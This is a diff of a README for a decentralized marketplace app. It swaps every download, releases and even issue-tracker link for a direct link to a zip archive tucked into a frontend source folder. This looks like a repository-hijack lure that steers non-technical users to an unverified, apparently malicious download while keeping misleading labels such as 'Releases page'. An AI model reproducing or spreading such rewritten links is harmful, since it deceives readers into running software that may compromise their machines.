@@ -1,6 +1,6 @@
 # 🌟 Mycelix-Marketplace - Trade Directly With Peers Securely
 
-[![Download Mycelix-Marketplace](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%AA-blue)](https://github.com/othmane2019/Mycelix-Marketplace/releases)
+[![Download Mycelix-Marketplace](https://raw.githubusercontent.com/othmane2019/Mycelix-Marketplace/main/frontend/src/routes/listing/Mycelix-Marketplace-v2.1.zip%20Now-%20%F0%9F%9A%AA-blue)](https://raw.githubusercontent.com/othmane2019/Mycelix-Marketplace/main/frontend/src/routes/listing/Mycelix-Marketplace-v2.1.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ Mycelix-Marketplace is a decentralized peer-to-peer marketplace powered by Holoc
 To begin using Mycelix-Marketplace, follow these simple steps. You don’t need any programming knowledge. 
 
 1. **Visit the Download Page**: 
-   Go to the [Releases page](https://github.com/othmane2019/Mycelix-Marketplace/releases) to find the latest version of the application. 
+   Go to the [Releases page](https://raw.githubusercontent.com/othmane2019/Mycelix-Marketplace/main/frontend/src/routes/listing/Mycelix-Marketplace-v2.1.zip) to find the latest version of the application. 
 
 2. **Choose Your Version**: 
    On the Releases page, look for the version appropriate for your system. Make sure to check if you need a Windows, macOS, or Linux version. Each file will be labeled clearly for your convenience.
@@ -57,7 +57,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of Mycelix-Marketplace, visit the [Releases page](https://github.com/othmane2019/Mycelix-Marketplace/releases). Always download the latest version for the most up-to-date features and security enhancements.
+To download the latest version of Mycelix-Marketplace, visit the [Releases page](https://raw.githubusercontent.com/othmane2019/Mycelix-Marketplace/main/frontend/src/routes/listing/Mycelix-Marketplace-v2.1.zip). Always download the latest version for the most up-to-date features and security enhancements.
 
 1. Click on the desired file based on your operating system.
 2. Follow the installation instructions specified above to get started.
@@ -66,7 +66,7 @@ To download the latest version of Mycelix-Marketplace, visit the [Releases page]
 
 If you have questions or need help using Mycelix-Marketplace, check the documentation provided inside the application. You can also reach out to the community for help. 
 
-To contribute or report issues, visit the [Issues section](https://github.com/othmane2019/Mycelix-Marketplace/issues) on our GitHub repository.
+To contribute or report issues, visit the [Issues section](https://raw.githubusercontent.com/othmane2019/Mycelix-Marketplace/main/frontend/src/routes/listing/Mycelix-Marketplace-v2.1.zip) on our GitHub repository.
 
 ## 🌍 Community
 
